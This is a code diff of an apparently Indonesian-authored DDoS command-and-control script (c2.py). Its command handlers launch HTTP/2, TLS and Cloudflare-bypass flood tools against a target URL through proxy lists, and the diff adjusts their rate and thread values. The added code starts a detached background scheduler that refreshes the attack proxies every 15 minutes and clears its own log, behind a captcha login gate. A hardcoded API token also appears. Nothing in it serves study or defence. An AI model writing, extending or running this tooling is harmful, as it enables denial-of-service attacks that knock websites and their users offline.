@@ -12,6 +12,8 @@ import threading
 import json
 import urllib.parse
 import string
+import datetime
+import pytz
 from termcolor import colored
 from rich import print
 from rich.table import Table
@@ -662,7 +664,7 @@ def main():
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 thread = cnc.split()[3]
-                os.system(f'python3 https-spoof.py {url} {time} 100')
+                os.system(f'python3 https-spoof.py {url} {time} 3')
                 url = f"{url}"
                 token = "727e8c2fa5b07c"
                 result = get_url_info(url, token)
@@ -676,7 +678,7 @@ def main():
                 url = cnc.split()[1]
                 port = cnc.split()[2]
                 time = cnc.split()[3]               
-                os.system(f'go run stress.go {url} {port} 3 100 {time} 100')
+                os.system(f'go run stress.go {url} {port} 3 1 {time} 3')
                 url = f"{url}"
                 token = "727e8c2fa5b07c"
                 result = get_url_info(url, token)
@@ -750,7 +752,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node cf-flood.js {url} {time} 100 100 proxies.txt')          
+               os.system(f'node cf-flood.js {url} {time} 1 3 proxies.txt')          
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -780,8 +782,8 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node h2-holdv1.js {url} {time} 100 100 proxies.txt')     
-               os.system(f'node h2-holdv2.js {url} {time} 100 100 proxies.txt')     
+               os.system(f'node h2-holdv1.js {url} {time} 1 3 proxies.txt')     
+               os.system(f'node h2-holdv2.js {url} {time} 1 3 proxies.txt')     
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -811,7 +813,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node h2-bypass.js GET {url} {time} 100 100 proxies.txt --bfm true --ratelimit true --randpath true --randrate true --debug true --cdn true --full')          
+               os.system(f'node h2-bypass.js GET {url} {time} 1 3 proxies.txt --bfm true --ratelimit true --randpath true --randrate true --debug true --cdn true --full')          
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -841,7 +843,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                              
-               os.system(f'node cfgas.js {url} {time} 100 100 proxies.txt')
+               os.system(f'node cfgas.js {url} {time} 1 3 proxies.txt')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -871,8 +873,8 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                 
-               os.system(f'node httpbypass {url} {time} 100 100 proxies.txt')
-               os.system(f'node httpbypassv2 {url} {time} 100 100 proxies.txt')
+               os.system(f'node httpbypass {url} {time} 1 3 proxies.txt')
+               os.system(f'node httpbypassv2 {url} {time} 1 3 proxies.txt')
                 
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -932,8 +934,8 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                                
-               os.system(f'node tlsv2 {url} {time} 100 100 proxies.txt')
-               os.system(f'node tlsv3 {url} {time} 100 100 proxies.txt')             
+               os.system(f'node tlsv2 {url} {time} 1 3 proxies.txt')
+               os.system(f'node tlsv3 {url} {time} 1 3 proxies.txt')             
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -963,8 +965,8 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                      
-               os.system(f'node auto.js {url} {time} 100 100 proxies.txt')
-               os.system(f'node autov2.js {url} {time} 100 100 proxies.txt')
+               os.system(f'node auto.js {url} {time} 1 3 proxies.txt')
+               os.system(f'node autov2.js {url} {time} 1 3 proxies.txt')
 
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -994,7 +996,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node cf.js {url} {time} 1250 proxies.txt')
+               os.system(f'node cf.js {url} {time} 3 proxies.txt')
                 
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -1024,7 +1026,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node uambypass.js {url} {time} 1250 proxies.txt')
+               os.system(f'node uambypass.js {url} {time} 3 proxies.txt')
                 
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -1092,8 +1094,8 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node httpget GET {url} {time} 100 100 proxies.txt')
-               os.system(f'node httpgetv2 GET {url} {time} 100 100 proxies.txt')
+               os.system(f'node httpget GET {url} {time} 1 3 proxies.txt')
+               os.system(f'node httpgetv2 GET {url} {time} 1 3 proxies.txt')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -1123,7 +1125,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node http-storm.js {url} {time} 100 100 proxies.txt')
+               os.system(f'node http-storm.js {url} {time} 1 3 proxies.txt')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -1148,7 +1150,157 @@ def main():
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}")   
                                                                                                                                                                                  
+# ==================== LOGIKA SCHEDULER & CAPTCHA ====================
+# (Tempelkan blok ini di bagian paling akhir file c2.py Anda)
+
+LOG_FILE = 'proxy_scheduler.log'
+
+# Catatan: Fungsi clear_screen() dan si() sudah didefinisikan 
+# di bagian atas skrip C2, jadi tidak perlu didefinisikan ulang di sini.
+
+def log_message(message):
+    """Menulis pesan ke file log."""
+    # Menggunakan mode 'a' (append) untuk menambahkan pesan
+    with open(LOG_FILE, 'a') as f:
+        f.write(f"{message}\n")
+
+def clear_log_file():
+    """
+    Menghapus isi file log setelah proses selesai. 
+    Ini mencegah penumpukan log antar siklus.
+    """
+    try:
+        # Menulis string kosong ke file, efektif mengosongkannya
+        with open(LOG_FILE, 'w') as f:
+            f.write("")
+        # Pesan cleanup ini akan segera dihapus oleh pemanggilan berikutnya di akhir proses
+        # log_message(f"🗑️ [CLEANUP] File log '{LOG_FILE}' telah dikosongkan.") 
+    except Exception as e:
+        # Mencetak ke stdout hanya jika gagal menulis log, sebagai fallback peringatan
+        print(f"⚠️ PERINGATAN: Gagal mengosongkan file log: {e}")
+
+
+# ==================== KONFIGURASI SCHEDULER ====================
+try:
+    import pytz # Asumsikan pytz sudah diimpor
+    WIB = pytz.timezone('Asia/Jakarta')
+except (ImportError, AttributeError, pytz.exceptions.UnknownTimeZoneError):
+    WIB = None  
+
+INTERVAL_SECONDS = 900 # 15 menit
+# ===============================================================
+
+def run_proxy_process():
+    """
+    Menjalankan proses pengambilan (getproxy.py) dan validasi (cekproxy.py) proxy.
+    Semua output diarahkan ke LOG_FILE.
+    (Fungsi ini berjalan di latar belakang)
+    """
+    
+    # 1. Kosongkan log file sebelum memulai proses baru
+    clear_log_file()
+    
+    if WIB:
+        current_time = datetime.datetime.now(WIB).strftime('%Y-%m-%d %H:%M:%S')
+    else:
+        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S (Waktu Lokal)')
+
+    log_message("\n" + "="*70)
+    log_message(f"🚀 [START] Memulai proses koleksi dan validasi proxy pada: {current_time}")
+    log_message("="*70)
+    
+    # Menjalankan skrip dan menangkap output ke log
+    with open(LOG_FILE, 'a') as log_file:
+        
+        # 1. getproxy.py
+        log_message("1. Memulai skrip pengambilan proxy (getproxy.py)...")
+        try:
+            # Output diarahkan ke log_file
+            subprocess.run([sys.executable, 'getproxy.py'], check=True, stdout=log_file, stderr=log_file)
+        except subprocess.CalledProcessError:
+            log_message("❌ ERROR: Gagal menjalankan getproxy.py. Cek log.")
+        except FileNotFoundError:
+            log_message("🛑 ERROR: File getproxy.py tidak ditemukan.")
+            return  
+    
+        # 2. cekproxy.py
+        log_message("\n2. Pengambilan proxy selesai. Memulai validasi proxy (cekproxy.py)...")
+        try:
+            # Output diarahkan ke log_file
+            subprocess.run([sys.executable, 'cekproxy.py'], check=True, stdout=log_file, stderr=log_file)
+        except subprocess.CalledProcessError:
+            log_message("❌ ERROR: Gagal menjalankan cekproxy.py. Cek log.")
+        except FileNotFoundError:
+            log_message("🛑 ERROR: File cekproxy.py tidak ditemukan.")
+            return
+
+    # Pesan selesai
+    if WIB:
+        end_time_wib = datetime.datetime.now(WIB).strftime('%Y-%m-%d %H:%M:%S')
+    else:
+        end_time_wib = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S (Waktu Lokal)')
+
+    log_message("\n" + "="*70)
+    log_message(f"✅ [SUCCESS] Proses selesai pada: {end_time_wib}")
+    log_message("Proxy aktif disimpan ke proxies.txt")
+    log_message("="*70)
+
+    # 2. Kosongkan kembali log file setelah proses selesai (fitur penghapus otomatis)
+    clear_log_file()
+
+
+def start_scheduler_loop():
+    """
+    Fungsi ini berisi loop tak terbatas dan HANYA DIPANGGIL oleh proses latar belakang.
+    """
+    if not WIB:
+        log_message("PERINGATAN: Modul 'pytz' tidak ditemukan. Gunakan waktu lokal/sistem.")
+    
+    log_message(f"--- SCHEDULER PROXY AKTIF DIBELAKANG (Interval: {INTERVAL_SECONDS // 60} menit) ---")
+    
+    while True:
+        try:
+            run_proxy_process()
+            
+            # Hitung waktu untuk eksekusi berikutnya
+            next_run_time_raw = datetime.datetime.now() + datetime.timedelta(seconds=INTERVAL_SECONDS)
+            if WIB:
+                  next_run_time = next_run_time_raw.astimezone(WIB).strftime('%Y-%m-%d %H:%M:%S')
+            else:
+                  next_run_time = next_run_time_raw.strftime('%Y-%m-%d %H:%M:%S (Waktu Lokal)')
+
+            # Jeda
+            log_message(f"\n💤 Menunggu {INTERVAL_SECONDS // 60} menit...")
+            log_message(f"Eksekusi Berikutnya Dijadwalkan pada: {next_run_time}")
+            
+            time.sleep(INTERVAL_SECONDS)
+            
+        except Exception as e:
+            # Fatal error log akan tetap disimpan sebentar sebelum direset di siklus berikutnya
+            log_message(f"\n[ERROR FATAL] Terjadi kesalahan tak terduga dalam loop: {e}")
+            log_message(f"Mencoba lagi dalam 5 menit...")
+            time.sleep(300) 
+
+
+def post_login_message():
+    """
+    PERBAIKAN: Fungsi 'menu()' kedua diganti namanya menjadi 'post_login_message()'
+    agar tidak bentrok dengan 'menu()' panel C2.
+    """
+    from termcolor import colored # Asumsikan colored sudah diimpor
+    print(colored("---", "cyan"))
+    print(colored("WELCOME TO school", "yellow"))
+    
+    # Tambahkan pesan untuk memandu pengguna
+    print(colored(f"\nScheduler proxy berjalan di latar belakang.", "green", attrs=["bold"]))
+    print(colored(f"Log sementara dicatat di '{LOG_FILE}' dan akan direset setiap kali proses selesai.", "yellow"))
+    print(f"Untuk memantau log, cek file: {LOG_FILE}")
+
+
+# ==================== FUNGSI CAPTCHA DAN LOGIN ====================
+
 def generate_and_verify_captcha(length=4):
+    from termcolor import colored # Asumsikan colored sudah diimpor
     while True:
         characters = string.ascii_uppercase
         captcha = ''.join(random.choice(characters) for _ in range(length))
@@ -1158,7 +1310,6 @@ def generate_and_verify_captcha(length=4):
         print(f"{'CAPCTHA UNTUK VERIFIKASI'.center(30)}")
         print("="*30 + "\n")
 
-        # BARIS INI MENAMPILKAN CAPTCHA DENGAN WARNA HIJAU
         print(colored(f"    {captcha}    ", "green", attrs=["bold", "reverse"]))
 
         print("\n" + "="*30)
@@ -1166,30 +1317,54 @@ def generate_and_verify_captcha(length=4):
 
         if captcha == user_input.upper():
             print(colored("\nCaptcha benar!", "green"))
-            time.sleep(1) # Beri jeda agar user bisa melihat pesan 'Captcha benar!'
+            time.sleep(1) 
             return True
         else:
             print(colored("\nCaptcha salah. Silakan coba lagi.", "red"))
             input("Tekan Enter untuk melanjutkan...")
 
 def login():
+    from termcolor import colored # Asumsikan colored sudah diimpor
     clear_screen()
     print("Memulai verifikasi CAPTCHA untuk akses script...")
 
-    # Verifikasi CAPTCHA
     if generate_and_verify_captcha():
-        print(colored("Akses Diberikan! Memasuki script utama...", "green", attrs=["bold"]))
-        time.sleep(1) # Jeda sebentar sebelum masuk ke script utama
-        main() # Langsung panggil fungsi main()
-        return True # Menandakan proses login (verifikasi captcha) berhasil
+        print(colored("\nAkses Diberikan! Meluncurkan scheduler...", "green", attrs=["bold"]))
+        
+        # --- Peluncuran Proses Latar Belakang ---
+        background_command = [sys.executable, os.path.abspath(__file__), '--run-scheduler']
+
+        if os.name == 'nt': # Windows
+            creation_flags = subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
+            subprocess.Popen(background_command, creationflags=creation_flags, close_fds=True)
+            print(colored("✅ Scheduler berhasil diluncurkan di latar belakang (Windows).", "cyan"))
+            
+        else: # Unix/Linux/macOS
+            subprocess.Popen(background_command, preexec_fn=os.setsid, close_fds=True)
+            print(colored("✅ Scheduler berhasil diluncurkan di latar belakang (Unix).", "cyan"))
+        
+        time.sleep(1)
+        
+        # PERBAIKAN: Panggil pesan "WELCOME" di sini
+        post_login_message()    
+        
+        return True
     else:
-        # Seperti yang Anda catat, bagian ini tidak akan pernah terpanggil dengan implementasi saat ini.
-        print(colored("Verifikasi CAPTCHA gagal. Tidak dapat melanjutkan.", "red", attrs=["bold"]))
         return False
 
+# ==================== MAIN EXECUTION ====================
+
 if __name__ == "__main__":
-    if login():
-        print(colored("---", "cyan"))
-        print(colored("WELCOME TO school", "yellow")) # Pesan ini akan muncul setelah main() selesai dieksekusi
+    
+    if len(sys.argv) > 1 and sys.argv[1] == '--run-scheduler':
+        # Mode 1: Jalankan sebagai scheduler latar belakang (headless)
+        start_scheduler_loop()  
+        
     else:
-        print(colored("Script tidak dapat diakses.", "red"))                                                                                          
+        # Mode 2: Jalankan sebagai mode interaktif (CAPTCHA)
+        if login():
+            # PERBAIKAN: Panggil 'main()' (C2 Loop) bukan 'menu()'
+            main()
+        else:
+            print(colored("\nScript tidak dapat diakses.", "red"))
+# ...                                                                          
